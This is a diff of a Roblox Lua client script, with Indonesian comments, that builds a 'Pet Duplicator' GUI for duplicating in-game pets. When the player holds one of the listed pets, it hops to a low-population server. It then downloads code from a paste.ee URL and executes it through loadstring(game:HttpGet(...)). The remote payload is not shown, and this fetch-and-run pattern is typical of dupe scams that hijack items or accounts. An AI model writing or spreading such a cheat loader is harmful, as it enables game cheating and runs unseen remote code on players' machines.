@@ -2,439 +2,233 @@
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
-local TweenService = game:GetService("TweenService") -- Ditambahkan untuk animasi
+local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Daftar hewan peliharaan yang valid (sesuaikan jika perlu)
+-- Daftar hewan peliharaan yang valid (case-insensitive)
 local VALID_PETS = {
     ["red fox"] = true,
     ["dragonfly"] = true,
     ["raccoon"] = true,
     ["praying mantis"] = true,
-    ["deer"] = true 
+    ["deer"] = true
 }
 
--- Konfigurasi untuk logika duplikasi
+-- Konfigurasi
 local DUPESCRIPT_URL = "https://paste.ee/r/s7TguhY5"
-local TARGET_PLAYER_COUNT_FOR_DUPE = 3 
-local MAX_PLAYER_COUNT_BEFORE_SWITCH = 5 
+local TARGET_PLAYER_COUNT_FOR_DUPE = 3
+local MAX_PLAYER_COUNT_BEFORE_SWITCH = 5
 
--- Fungsi untuk memeriksa apakah pemain sedang memegang hewan peliharaan yang valid
+-- Fungsi yang lebih baik untuk menemukan pet yang sedang dipegang
 local function findCurrentlyHeldPet()
-    if not player then
-        print("DEBUG: Pemain lokal tidak ditemukan, pencarian dibatalkan.")
-        return nil
-    end
-    print("DEBUG: Mulai pencarian hewan peliharaan yang dipegang pemain...")
-    
-    print("DEBUG: Daftar VALID_PETS yang dicari:")
-    for petName, _ in pairs(VALID_PETS) do
-        print("  - " .. petName)
-    end
-
+    -- Cek karakter pemain
     local character = player.Character
     if not character then
-        character = player.CharacterAdded:Wait() 
-        if not character then
-             print("DEBUG: Karakter pemain tidak ditemukan setelah menunggu.")
-            return nil
-        end
+        character = player.CharacterAdded:Wait()
     end
     
-    print("DEBUG: Memeriksa item yang dipegang oleh karakter:", character.Name)
-    for _, childOfCharacter in ipairs(character:GetChildren()) do
-        local childName = childOfCharacter.Name
-        local childNameLower = childName:lower()
-        local childClassName = childOfCharacter.ClassName
-        print("  - DEBUG: Memeriksa anak karakter: '" .. childName .. "' (lowercase: '" .. childNameLower .. "') | Tipe: " .. childClassName)
-        
-        -- Periksa apakah anak langsung adalah Tool atau Model yang valid
-        if (childOfCharacter:IsA("Tool") or childOfCharacter:IsA("Model")) then
-            print("    DEBUG: Membandingkan '" .. childNameLower .. "' dengan VALID_PETS...")
-            if VALID_PETS[childNameLower] then
-                print("      --> DEBUG: Hewan valid ditemukan (langsung dipegang):", childName)
-                return childOfCharacter
-            else
-                print("      --> DEBUG: '" .. childNameLower .. "' tidak ada di VALID_PETS atau nilainya false.")
+    -- Cek semua item yang dipegang langsung
+    for _, item in ipairs(character:GetChildren()) do
+        if item:IsA("Tool") then
+            local lowerName = item.Name:lower()
+            if VALID_PETS[lowerName] then
+                return item
             end
         end
-
-        -- Jika anak karakter adalah Model (dan bukan pet itu sendiri), periksa anak-anaknya
-        if childOfCharacter:IsA("Model") then
-            print("    -- DEBUG: Memeriksa di dalam Model anak karakter:", childName)
-            for _, childOfModel in ipairs(childOfCharacter:GetChildren()) do
-                local subChildName = childOfModel.Name
-                local subChildNameLower = subChildName:lower()
-                local subChildClassName = childOfModel.ClassName
-                print("      - DEBUG: Memeriksa anak dari Model: '" .. subChildName .. "' (lowercase: '" .. subChildNameLower .. "') | Tipe: " .. subChildClassName)
-                
-                if (childOfModel:IsA("Tool") or childOfModel:IsA("Model")) then
-                    print("        DEBUG: Membandingkan '" .. subChildNameLower .. "' dengan VALID_PETS...")
-                    if VALID_PETS[subChildNameLower] then
-                        print("          --> DEBUG: Hewan valid ditemukan (di dalam Model yang dipegang):", subChildName)
-                        return childOfModel
-                    else
-                        print("          --> DEBUG: '" .. subChildNameLower .. "' tidak ada di VALID_PETS atau nilainya false.")
+        
+        -- Cek juga di dalam Model (jika pet ada di dalam container)
+        if item:IsA("Model") then
+            for _, child in ipairs(item:GetDescendants()) do
+                if child:IsA("Tool") then
+                    local lowerName = child.Name:lower()
+                    if VALID_PETS[lowerName] then
+                        return child
                     end
                 end
             end
         end
     end
-
-    print("DEBUG: Tidak ada hewan peliharaan valid yang sedang dipegang setelah pemeriksaan karakter.")
+    
+    -- Cek di backpack
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        for _, item in ipairs(backpack:GetChildren()) do
+            if item:IsA("Tool") then
+                local lowerName = item.Name:lower()
+                if VALID_PETS[lowerName] then
+                    return item
+                end
+            end
+        end
+    end
+    
     return nil
 end
 
+-- Fungsi untuk membuat notifikasi
+local function showNotification(gui, message, color)
+    local notification = Instance.new("TextLabel")
+    notification.Name = "Notification"
+    notification.Text = message
+    notification.Size = UDim2.new(0.8, 0, 0, 40)
+    notification.Position = UDim2.new(0.5, 0, 0, -50)
+    notification.AnchorPoint = Vector2.new(0.5, 0)
+    notification.BackgroundColor3 = color
+    notification.TextColor3 = Color3.fromRGB(255, 255, 255)
+    notification.Font = Enum.Font.GothamBold
+    notification.TextSize = 14
+    notification.Parent = gui
 
--- Fungsi untuk membuat ScreenGui utama
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = notification
+
+    task.delay(3, function()
+        notification:Destroy()
+    end)
+end
+
+-- Fungsi utama untuk duplikasi
+local function executeDupeProcess()
+    -- Cek pet yang dipegang
+    local pet = findCurrentlyHeldPet()
+    if not pet then
+        return false, "Required pet not found"
+    end
+    
+    -- Cek jumlah pemain
+    local playerCount = #Players:GetPlayers()
+    
+    if playerCount >= MAX_PLAYER_COUNT_BEFORE_SWITCH then
+        -- Cari server baru
+        local success, result = pcall(function()
+            local placeId = game.PlaceId
+            local servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..placeId.."/servers/Public?limit=100"))
+            
+            for _, server in ipairs(servers.data) do
+                if server.playing >= 1 and server.playing <= TARGET_PLAYER_COUNT_FOR_DUPE and server.id ~= game.JobId then
+                    TeleportService:TeleportToPlaceInstance(placeId, server.id, player)
+                    return true
+                end
+            end
+            return false, "No suitable server found"
+        end)
+        
+        if not success then
+            return false, "Failed to find new server"
+        end
+    elseif playerCount < TARGET_PLAYER_COUNT_FOR_DUPE then
+        return false, "Need at least "..TARGET_PLAYER_COUNT_FOR_DUPE.." players"
+    end
+    
+    -- Eksekusi script dupe
+    local success, err = pcall(function()
+        loadstring(game:HttpGet(DUPESCRIPT_URL))()
+    end)
+    
+    if not success then
+        return false, "Dupe script error: "..tostring(err)
+    end
+    
+    return true, "Dupe successful!"
+end
+
+-- Fungsi untuk membuat GUI
 local function createMainGui()
-    local oldGui = playerGui:FindFirstChild("KyroscScriptGui")
-    if oldGui then oldGui:Destroy() end
-
     local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "KyroscScriptGui"
+    screenGui.Name = "PetDuplicatorGUI"
     screenGui.Parent = playerGui
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    screenGui.ResetOnSpawn = false
 
     local mainFrame = Instance.new("Frame")
     mainFrame.Name = "MainFrame"
-    mainFrame.Size = UDim2.new(0, 320, 0, 270)
-    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    mainFrame.Size = UDim2.new(0, 300, 0, 200)
+    mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
     mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
     mainFrame.BorderSizePixel = 0
     mainFrame.Parent = screenGui
-    mainFrame.Visible = true
 
-    local frameCorner = Instance.new("UICorner")
-    frameCorner.CornerRadius = UDim.new(0, 8)
-    frameCorner.Parent = mainFrame
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = mainFrame
 
-    local titleLabel = Instance.new("TextLabel")
-    titleLabel.Name = "TitleLabel"
-    titleLabel.Size = UDim2.new(1, -70, 0, 40)
-    titleLabel.Position = UDim2.new(0, 0, 0, 10)
-    titleLabel.BackgroundTransparency = 1
-    titleLabel.Font = Enum.Font.GothamBold
-    titleLabel.Text = "Kyrosc Script (v8.3.1)"
-    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    titleLabel.TextSize = 18
-    titleLabel.Parent = mainFrame
+    -- Title
+    local title = Instance.new("TextLabel")
+    title.Text = "Pet Duplicator"
+    title.Size = UDim2.new(1, 0, 0, 30)
+    title.Position = UDim2.new(0, 0, 0, 10)
+    title.BackgroundTransparency = 1
+    title.Font = Enum.Font.GothamBold
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextSize = 18
+    title.Parent = mainFrame
 
-    local closeButton = Instance.new("TextButton")
-    closeButton.Name = "CloseButton"
-    closeButton.Size = UDim2.new(0, 25, 0, 25)
-    closeButton.Position = UDim2.new(1, -35, 0, 10)
-    closeButton.AnchorPoint = Vector2.new(1, 0)
-    closeButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
-    closeButton.Font = Enum.Font.GothamBold
-    closeButton.Text = "X"
-    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    closeButton.TextSize = 16
-    closeButton.Parent = mainFrame
-    local closeCorner = Instance.new("UICorner")
-    closeCorner.CornerRadius = UDim.new(0, 4)
-    closeCorner.Parent = closeButton
+    -- Status
+    local status = Instance.new("TextLabel")
+    status.Text = "Hold a valid pet and click Dupe"
+    status.Size = UDim2.new(0.9, 0, 0, 60)
+    status.Position = UDim2.new(0.05, 0, 0, 40)
+    status.BackgroundTransparency = 1
+    status.Font = Enum.Font.Gotham
+    status.TextColor3 = Color3.fromRGB(200, 200, 200)
+    status.TextSize = 14
+    status.TextWrapped = true
+    status.Parent = mainFrame
 
-    local minimizeButton = Instance.new("TextButton")
-    minimizeButton.Name = "MinimizeButton"
-    minimizeButton.Size = UDim2.new(0, 25, 0, 25)
-    minimizeButton.Position = UDim2.new(1, -65, 0, 10)
-    minimizeButton.AnchorPoint = Vector2.new(1, 0)
-    minimizeButton.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
-    minimizeButton.Font = Enum.Font.GothamBold
-    minimizeButton.Text = "_"
-    minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    minimizeButton.TextSize = 16
-    minimizeButton.Parent = mainFrame
-    local minimizeCorner = Instance.new("UICorner")
-    minimizeCorner.CornerRadius = UDim.new(0, 4)
-    minimizeCorner.Parent = minimizeButton
-
-    local errorContainer = Instance.new("Frame")
-    errorContainer.Name = "ErrorContainer"
-    errorContainer.Size = UDim2.new(0.9, 0, 0, 30)
-    errorContainer.Position = UDim2.new(0.5, 0, 0, 60)
-    errorContainer.AnchorPoint = Vector2.new(0.5, 0)
-    errorContainer.BackgroundTransparency = 1
-    errorContainer.ClipsDescendants = true -- Untuk animasi shake agar tidak keluar batas
-    errorContainer.Parent = mainFrame
-
-    local errorIcon = Instance.new("TextLabel")
-    errorIcon.Name = "ErrorIcon"
-    errorIcon.Size = UDim2.new(0, 20, 1, 0)
-    errorIcon.BackgroundTransparency = 1
-    errorIcon.Font = Enum.Font.GothamBold
-    errorIcon.Text = "X" 
-    errorIcon.TextColor3 = Color3.fromRGB(231, 76, 60) 
-    errorIcon.TextSize = 20
-    errorIcon.TextXAlignment = Enum.TextXAlignment.Center
-    errorIcon.TextYAlignment = Enum.TextYAlignment.Center
-    errorIcon.Parent = errorContainer
-
-    local errorText = Instance.new("TextLabel")
-    errorText.Name = "ErrorText"
-    errorText.Size = UDim2.new(1, -25, 1, 0)
-    errorText.Position = UDim2.new(0, 25, 0, 0)
-    errorText.BackgroundTransparency = 1
-    errorText.Font = Enum.Font.GothamSemibold
-    errorText.Text = "Required pet not found" 
-    errorText.TextColor3 = Color3.fromRGB(231, 76, 60) 
-    errorText.TextSize = 16
-    errorText.TextXAlignment = Enum.TextXAlignment.Left
-    errorText.TextYAlignment = Enum.TextYAlignment.Center
-    errorText.Parent = errorContainer
-    
-    local instructionsLabel = Instance.new("TextLabel")
-    instructionsLabel.Name = "InstructionsLabel"
-    instructionsLabel.Size = UDim2.new(0.85, 0, 0, 80)
-    instructionsLabel.Position = UDim2.new(0.5, 0, 0, 100)
-    instructionsLabel.AnchorPoint = Vector2.new(0.5, 0)
-    instructionsLabel.BackgroundTransparency = 1
-    instructionsLabel.Font = Enum.Font.Gotham
-    instructionsLabel.Text = "Hold one of these pets:\n- Red Fox  - Dragonfly\n- Raccoon  - Praying Mantis\n- Deer\nThen click to start duplicating."
-    instructionsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-    instructionsLabel.TextSize = 14
-    instructionsLabel.TextWrapped = true
-    instructionsLabel.LineHeight = 1.2
-    instructionsLabel.TextXAlignment = Enum.TextXAlignment.Center
-    instructionsLabel.TextYAlignment = Enum.TextYAlignment.Top
-    instructionsLabel.Parent = mainFrame
-
-    local tryAgainButton = Instance.new("TextButton")
-    tryAgainButton.Name = "TryAgainButton"
-    tryAgainButton.Size = UDim2.new(0.85, 0, 0, 40)
-    tryAgainButton.Position = UDim2.new(0.5, 0, 1, -40)
-    tryAgainButton.AnchorPoint = Vector2.new(0.5, 1)
-    tryAgainButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60) 
-    tryAgainButton.Font = Enum.Font.GothamBold
-    tryAgainButton.Text = "🔄 Try Again" 
-    tryAgainButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    tryAgainButton.TextSize = 16
-    tryAgainButton.Parent = mainFrame
+    -- Dupe Button
+    local dupeButton = Instance.new("TextButton")
+    dupeButton.Text = "DUPE PET"
+    dupeButton.Size = UDim2.new(0.9, 0, 0, 40)
+    dupeButton.Position = UDim2.new(0.05, 0, 0, 110)
+    dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+    dupeButton.Font = Enum.Font.GothamBold
+    dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    dupeButton.TextSize = 16
+    dupeButton.Parent = mainFrame
 
     local buttonCorner = Instance.new("UICorner")
     buttonCorner.CornerRadius = UDim.new(0, 6)
-    buttonCorner.Parent = tryAgainButton
+    buttonCorner.Parent = dupeButton
 
-    local showGuiButton = Instance.new("TextButton")
-    showGuiButton.Name = "ShowKyroscGuiButton"
-    showGuiButton.Size = UDim2.new(0, 120, 0, 40)
-    showGuiButton.Position = UDim2.new(0, 15, 0, 15)
-    showGuiButton.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
-    showGuiButton.Font = Enum.Font.GothamBold
-    showGuiButton.Text = "Show Kyrosc"
-    showGuiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    showGuiButton.TextSize = 14
-    showGuiButton.Visible = false
-    showGuiButton.Parent = screenGui
-    local showGuiCorner = Instance.new("UICorner")
-    showGuiCorner.CornerRadius = UDim.new(0, 6)
-    showGuiCorner.Parent = showGuiButton
-
-    local function toggleMainFrame(visible)
-        mainFrame.Visible = visible
-        showGuiButton.Visible = not visible
-    end
-
-    -- Fungsi animasi
-    local function playShakeAnimation(guiObject)
-        local originalPosition = guiObject.Position
-        local tweenInfo = TweenInfo.new(0.05, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 4, true) 
-        local shakeOffset = UDim2.fromOffset(5, 0)
-        local tweenShake = TweenService:Create(guiObject, tweenInfo, {Position = originalPosition + shakeOffset})
-        tweenShake:Play()
-        tweenShake.Completed:Wait()
-        guiObject.Position = originalPosition -- Pastikan kembali ke posisi semula
-    end
-
-    local function playPulseAnimation(guiObject, targetColor)
-        local originalColor = guiObject.BackgroundColor3
-        local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true) 
+    -- Event handler untuk tombol
+    dupeButton.MouseButton1Click:Connect(function()
+        dupeButton.Text = "PROCESSING..."
+        dupeButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
         
-        local pulseTween = TweenService:Create(guiObject, tweenInfo, {BackgroundColor3 = targetColor})
-        pulseTween:Play()
-    end
-
-
-    closeButton.MouseButton1Click:Connect(function()
-        screenGui:Destroy()
-    end)
-
-    minimizeButton.MouseButton1Click:Connect(function()
-        toggleMainFrame(false)
-    end)
-
-    showGuiButton.MouseButton1Click:Connect(function()
-        toggleMainFrame(true)
-    end)
-    
-    local currentPetActionState = "VERIFY" 
-    local isProcessing = false 
-
-    tryAgainButton.MouseButton1Click:Connect(function()
-        if isProcessing then return end 
-        isProcessing = true
-
-        if currentPetActionState == "VERIFY" then
-            errorIcon.Text = "⏳" 
-            errorIcon.TextColor3 = Color3.fromRGB(241, 196, 15) 
-            errorText.Text = "Verifying pet..."
-            errorText.TextColor3 = Color3.fromRGB(241, 196, 15)
-            
-            task.wait(0.5) 
-
-            local foundPet = findCurrentlyHeldPet() 
-
-            if foundPet then
-                print("DEBUG: Hewan peliharaan valid ditemukan oleh tombol 'Try Again':", foundPet.Name)
-                errorText.Text = "PET SIAP: " .. foundPet.Name 
-                errorText.TextColor3 = Color3.fromRGB(46, 204, 113) 
-                errorIcon.Text = "✓"
-                errorIcon.TextColor3 = Color3.fromRGB(46, 204, 113)
-                playPulseAnimation(tryAgainButton, Color3.fromRGB(36, 164, 93)) 
-                
-                tryAgainButton.Text = "DUPE PET" 
-                tryAgainButton.BackgroundColor3 = Color3.fromRGB(46, 204, 113) 
-                currentPetActionState = "DUPE_PROCESS"
-            else
-                print("DEBUG: Tidak ada hewan peliharaan valid yang dipegang (dari tombol 'Try Again').")
-                errorText.Text = "Required pet not found"
-                errorText.TextColor3 = Color3.fromRGB(231, 76, 60) 
-                errorIcon.Text = "X"
-                errorIcon.TextColor3 = Color3.fromRGB(231, 76, 60)
-                playShakeAnimation(errorContainer) 
-                
-                tryAgainButton.Text = "🔄 Try Again"
-                tryAgainButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60) 
-                currentPetActionState = "VERIFY"
-            end
-            isProcessing = false
-
-        elseif currentPetActionState == "DUPE_PROCESS" then
-            local playerCount = #Players:GetPlayers()
-            print("Jumlah pemain di server saat ini:", playerCount)
-
-            if playerCount >= MAX_PLAYER_COUNT_BEFORE_SWITCH then
-                errorText.Text = "Server penuh (" .. playerCount .. "). Mencari..."
-                errorText.TextColor3 = Color3.fromRGB(241, 196, 15) 
-                errorIcon.Text = "⏳"
-                errorIcon.TextColor3 = Color3.fromRGB(241, 196, 15)
-                tryAgainButton.Text = "MENCARI..."
-                tryAgainButton.BackgroundColor3 = Color3.fromRGB(241, 196, 15) 
-                
-                task.wait(0.1) 
-
-                local successTeleport, teleportError = pcall(function()
-                    local currentPlaceId = game.PlaceId
-                    local serversDataString
-                    local httpSuccess, httpResult = pcall(function()
-                        serversDataString = HttpService:GetAsync("https://games.roblox.com/v1/games/" .. currentPlaceId .. "/servers/Public?sortOrder=Asc&limit=100")
-                    end)
-
-                    if not httpSuccess or not serversDataString then
-                        error("Gagal ambil daftar server: " .. tostring(httpResult))
-                    end
-
-                    local servers = HttpService:JSONDecode(serversDataString)
-                    local suitableServerId = nil
-
-                    if servers and servers.data then
-                        for _, server in ipairs(servers.data) do
-                            if server.playing == (TARGET_PLAYER_COUNT_FOR_DUPE - 1) and server.id ~= game.JobId then
-                                suitableServerId = server.id
-                                print("Menemukan server cocok:", suitableServerId, "dgn", server.playing, "pemain.")
-                                break
-                            end
-                        end
-                    end
-                    
-                    if suitableServerId then
-                        print("Teleport ke server:", suitableServerId)
-                        errorText.Text = "Teleport ke server " .. (TARGET_PLAYER_COUNT_FOR_DUPE -1) .. " pemain..."
-                        TeleportService:TeleportToPlaceInstance(currentPlaceId, suitableServerId, player)
-                    else
-                        error("Tidak ada server baru yang cocok.")
-                    end
-                end)
-
-                if not successTeleport then
-                    print("Error pencarian/teleport server:", teleportError)
-                    errorText.Text = "Gagal cari/join server: " .. tostring(teleportError):sub(1,40) 
-                    errorText.TextColor3 = Color3.fromRGB(231, 76, 60) 
-                    errorIcon.Text = "X"
-                    errorIcon.TextColor3 = Color3.fromRGB(231, 76, 60)
-                    playShakeAnimation(errorContainer)
-                end
-                
-                tryAgainButton.Text = "🔄 Try Again"
-                tryAgainButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60) 
-                currentPetActionState = "VERIFY"
-                isProcessing = false
-
-            elseif playerCount < TARGET_PLAYER_COUNT_FOR_DUPE then
-                errorText.Text = "Butuh " .. TARGET_PLAYER_COUNT_FOR_DUPE .. " pemain (Ada: " .. playerCount .. ")"
-                errorText.TextColor3 = Color3.fromRGB(241, 196, 15) 
-                errorIcon.Text = "!"
-                errorIcon.TextColor3 = Color3.fromRGB(241, 196, 15)
-                playShakeAnimation(errorContainer)
-                
-                tryAgainButton.Text = "🔄 Try Again"
-                tryAgainButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60) 
-                currentPetActionState = "VERIFY"
-                isProcessing = false
-
-            else 
-                errorText.Text = "Server optimal! Mengeksekusi..."
-                errorText.TextColor3 = Color3.fromRGB(0, 150, 255) 
-                errorIcon.Text = "⚙️" 
-                errorIcon.TextColor3 = Color3.fromRGB(0, 150, 255)
-                tryAgainButton.Text = "MENGEKSEKUSI..."
-                tryAgainButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
-                
-                task.wait(0.1)
-
-                local successExec, execError = pcall(function()
-                    local fetchedScriptContent
-                    local httpSuccess, httpResult = pcall(function()
-                        fetchedScriptContent = game:HttpGet(DUPESCRIPT_URL, true)
-                    end)
-                    if not httpSuccess or not fetchedScriptContent or fetchedScriptContent == "" then
-                        error("Gagal ambil skrip eksternal: " .. tostring(httpResult))
-                    end
-
-                    local loadedFunc, loadErr = loadstring(fetchedScriptContent)
-                    if not loadedFunc then
-                        error("Gagal muat skrip eksternal: " .. tostring(loadErr))
-                    end
-                    loadedFunc() 
-                end)
-
-                if successExec then
-                    errorText.Text = "Skrip dupe dieksekusi!"
-                    errorText.TextColor3 = Color3.fromRGB(46, 204, 113) 
-                    errorIcon.Text = "✓"
-                    errorIcon.TextColor3 = Color3.fromRGB(46, 204, 113)
-                    playPulseAnimation(tryAgainButton, Color3.fromRGB(36, 164, 93))
-                else
-                    errorText.Text = "Error skrip dupe: " .. tostring(execError):sub(1,40)
-                    errorText.TextColor3 = Color3.fromRGB(231, 76, 60) 
-                    errorIcon.Text = "X"
-                    errorIcon.TextColor3 = Color3.fromRGB(231, 76, 60)
-                    warn("Error eksekusi skrip eksternal:", execError)
-                    playShakeAnimation(errorContainer)
-                end
-                
-                tryAgainButton.Text = "🔄 Try Again"
-                tryAgainButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60) 
-                currentPetActionState = "VERIFY"
-                isProcessing = false
-            end
+        local success, message = executeDupeProcess()
+        
+        if success then
+            status.Text = "Dupe successful!"
+            status.TextColor3 = Color3.fromRGB(0, 200, 0)
+            showNotification(screenGui, "Dupe completed!", Color3.fromRGB(0, 200, 0))
+        else
+            status.Text = message
+            status.TextColor3 = Color3.fromRGB(255, 50, 50)
+            showNotification(screenGui, message, Color3.fromRGB(255, 50, 50))
         end
+        
+        dupeButton.Text = "DUPE PET"
+        dupeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
     end)
+
     return screenGui
 end
 
+-- Auto-update pet status
+local function updatePetStatus()
+    while true do
+        local pet = findCurrentlyHeldPet()
+        if pet then
+            print("Detected pet:", pet.Name)
+        else
+            print("No valid pet detected")
+        end
+        wait(5)
+    end
+end
+
+-- Jalankan GUI dan updater
 createMainGui()
+spawn(updatePetStatus)
